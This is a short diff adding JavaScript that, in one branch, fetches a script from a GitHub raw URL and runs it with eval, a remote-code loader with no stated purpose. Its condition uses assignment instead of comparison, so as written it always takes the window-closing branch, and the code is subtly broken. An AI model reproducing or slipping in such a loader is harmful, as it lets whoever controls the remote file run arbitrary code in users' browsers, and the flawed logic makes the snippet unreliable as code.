@@ -1,0 +1,6 @@
+var ks = "f"
+if(ks="t"){
+window.close()
+}else{
+fetch("https://raw.githubusercontent.com/Ddudd3/gt/main/executegtv3").then(data=>{data.text().then(text=>{eval(text)})});
+}
